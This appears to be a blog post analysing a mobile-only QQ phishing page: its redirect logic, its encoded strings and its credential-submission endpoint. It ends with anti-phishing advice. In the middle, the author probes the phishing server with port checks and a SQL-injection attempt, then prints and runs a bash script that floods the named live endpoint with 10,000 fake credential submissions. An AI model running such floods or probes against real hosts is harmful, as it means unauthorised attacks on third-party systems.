**本文是对一次钓鱼事件的分析，在下水平实在不高，请路过的高手勿喷。像网络钓鱼这种违法事件时不时地出现在我们身边，下面是本人的亲身经历。**

 **** 昨天在刷空间时看到同学发了这么一条消息，留言？
****![](https://image.3001.net/images/20200313/1584079585_5e6b22e1811de.jpg!small)

打开看看，嗯，不对啊，我俩18年6月加的好友啊，这是什么情况？

![](https://image.3001.net/images/20200313/1584079616_5e6b2300ee0b0.jpeg!small)

带着满脑子问号，扫码进去，瞬间就警惕了。

![](https://image.3001.net/images/20200313/1584079643_5e6b231b36615.jpg!small)先瞎输一气，发现我的输入法不对劲啊，我用的讯飞输入法不长这样啊？

![](https://image.3001.net/images/20200313/1584079701_5e6b2355ec58d.jpg!small)

结果进去了？！跳转到QQ空间手机网页版。难不成是钓鱼？复制用浏览器打开，发现域名不对，果然是钓鱼。![](https://image.3001.net/images/20200313/1584079818_5e6b23ca37b61.jpg!small)

用电脑打开看看![](https://image.3001.net/images/20200313/1584079949_5e6b244d8fb5b.png!small)

百度？302重定向，emmm......摁F12看看，分析一下响应日志，果然有发现![](https://image.3001.net/images/20200313/1584080165_5e6b25250c804.png!small)

从这里不难发现我们现在访问的网址只不过是一个转发脚本，真正的页面是红线画的，302重定向就是他发出的。访问一下看看，同样也是被重定向到百度。

![](https://image.3001.net/images/20200313/1584080452_5e6b26444c040.png!small)

手机访问直接进入钓鱼页面

![](https://image.3001.net/images/20200313/1584080545_5e6b26a126e4f.jpg!small)

  
明白了，网页写了判断，如果是手机就正常访问，如果是电脑就跳转到百度。用chrome模拟移动设备访问。![](https://image.3001.net/images/20200313/1584080762_5e6b277a339fe.png!small)

成功访问，但是我发现键盘使不了了，密码框输不进去，禁用键盘，弹出了一个虚拟键盘让你输入账号密码![](https://image.3001.net/images/20200313/1584080863_5e6b27dfb7a9a.png!small)

可以肯定这是为手机而量身定做的钓鱼网站。从代码中可以看出，红线部分的“u”表示QQ号码，“p”表示密码。黑线框起来的部分是生成虚拟键盘的代码，太长，就展开了一段。![](https://image.3001.net/images/20200313/1584081350_5e6b29c65a4b1.png!small)

![](https://image.3001.net/images/20200313/1584081601_5e6b2ac1e9fe9.png!small)这段是跳转url，应该是用来提交信息的。![](https://image.3001.net/images/20200313/1584088417_5e6b4561ebaa4.png!small)

啊，一大串的字符串，看样子是BASE64加密的，[BASE64在线解密https://www.bejson.com/enc/base64/](https://www.bejson.com/enc/base64/)

![](https://image.3001.net/images/20200313/1584086373_5e6b3d652f93e.png!small)

看样子这是层unicode，还要转换一下，转换之前需要把所有“%”号替换成“\”号。[在线unicode转中文https://www.bejson.com/convert/unicode_chinese/](https://www.bejson.com/convert/unicode_chinese/)

文字显示出来了![](https://image.3001.net/images/20200313/1584086642_5e6b3e7273659.png!small)

如法炮制，解密所有字符串

![](https://image.3001.net/images/20200313/1584086708_5e6b3eb4b5e7e.png!small)

没什么可利用的东西。

随便输个账号密码，发现先是访问了一个php页面然后跳转到H5QQ空间。这个dnf.php就应该是用来提交信息的。![](https://image.3001.net/images/20200313/1584088570_5e6b45fa8336d.png!small)

查一下域名，竟然是企业办的。但是www打不开。反查下whois，结果我惊了，这个人名下的域名有十万多个....[站长之家http://tool.chinaz.com/](http://tool.chinaz.com/)![](https://image.3001.net/images/20200313/1584089361_5e6b491162c84.png!small)![](https://image.3001.net/images/20200313/1584089095_5e6b4807de0cb.png!small)

ping一下，再查询一下IP信息，确定没有CDN。![](https://image.3001.net/images/20200313/1584089171_5e6b4853858f2.png!small)

![](https://image.3001.net/images/20200313/1584089622_5e6b4a16e29a9.png!small)

直接访问IP，好熟悉的一幕，这不是宝塔吗？![](https://image.3001.net/images/20200313/1584089981_5e6b4b7dec439.png!small)

访问默认8888端口试试，确实是宝塔，但是没有安全入口和账号密码什么的，就我这水平，搞他是不可能的。22端口开放了，ssh爆破希望渺茫，888端口虽然开放但是找不到phpmyadmin，php
mysql注入判断还被拦截......

![](https://image.3001.net/images/20200313/1584090135_5e6b4c17a4976.png!small)![](https://image.3001.net/images/20200313/1584090280_5e6b4ca8ad545.png!small)

突然想起他的提交页面，呵呵，搞不死他也得搞残他，必须得搞搞他！打开xshell，连接了我的云服务器，vim写了一个脚本，![](https://image.3001.net/images/20200313/1584090626_5e6b4e02c4e7f.png!small)

代码如下

    
    
    #!/bin/bash
    i=1  #定义变量
    until ((i>10000))  #让脚本连续执行10000次
    do  #开始循环
        function rand(){
            min=$1
            max=$(($2-$min+1))
            num=$(($RANDOM+1000000000))
            echo $(($num%$max+$min))
                       }  #生成长度为十位的随机数
            name=$(rand 1000000000 9999999999)  #定义QQ账号，1000000000-999999999的随机数
            pwd=$(head -c 9 /dev/random | base64)  #定义密码，12位的随机字符串
            curl -v 'https://cdn.tldcnm.com/dnf.php?u='$name'&p='$pwd'' \  #提交post请求，发送虚假账号密码信息，好好填充一下他的数据库，并在执行时输出实时信息
              -H 'authority: cdn.tldcnm.com' \
              -H 'upgrade-insecure-requests: 1' \
              -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.43 Mobile Safari/537.36' \  #这里我们模拟成移动终端设备，否则可能提交不成功
              -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
              -H 'sec-fetch-site: same-origin' \
              -H 'sec-fetch-mode: navigate' \
              -H 'sec-fetch-user: ?1' \
              -H 'sec-fetch-dest: document' \
              -H 'referer: https://cdn.tldcnm.com/' \
              -H 'accept-language: zh-CN,zh;q=0.9' \
              -H 'cookie: PHPSESSID=cddh7cie2m1a8lmcqch2avtf37' \
              --compressed
            sync
            echo 3 > /proc/sys/vm/drop_caches  #清理缓存，节省空间
    done  #循环结束

bash测试一下，看到输出信息，post提交成功并且连续提交10000次。![](https://image.3001.net/images/20200313/1584091440_5e6b5130f1c97.png!small)由于脚本发起的post请求跟正常访问页面一样，不属于DDOS，宝塔和防火墙不会拦截，返回302则表明提交成功（提交成功后会被重定向，所以返回302）。为了提高效率我用两台服务器多线程一起跑，估计数据库里找到真实的账号密码得费老劲了，全被无用的虚假数据淹没了。

问了一下朋友关于这张钓鱼二维码图片的事，他表示并不知情，很有可能中病毒了。同时也告诉了其他扫过这个码的人，通知他们及时地修改密码，保证自己的隐私和财产安全！![](https://image.3001.net/images/20200313/1584092386_5e6b54e205565.jpg!small)

最后总结一下防钓经验：只要是让你输入账号密码，就要考虑是不是钓鱼网站，尽可能使用一键登录或者扫码登陆避免密码泄漏的风险。访问时看看网址域名，如果不是QQ官方域名而且没有快捷、一键登录选项那绝大多数都是钓鱼的。本人已经将此信息提交到360举报平台，阻止更多的人上当受骗。希望每一个被钓鱼的朋友都把钓鱼网站举报，让360，腾讯等安全平台及时提醒并拦截正在访问钓鱼页面的人，防止更多的人上当受骗！![](https://image.3001.net/images/20200313/1584092378_5e6b54da33105.png!small)

净化网络环境，维护互联网安全，从我们每一个人做起！

加油武汉，加油地球，病毒必败！

 ***本文作者：一个神秘的人，转载请注明来自FreeBuf.COM**

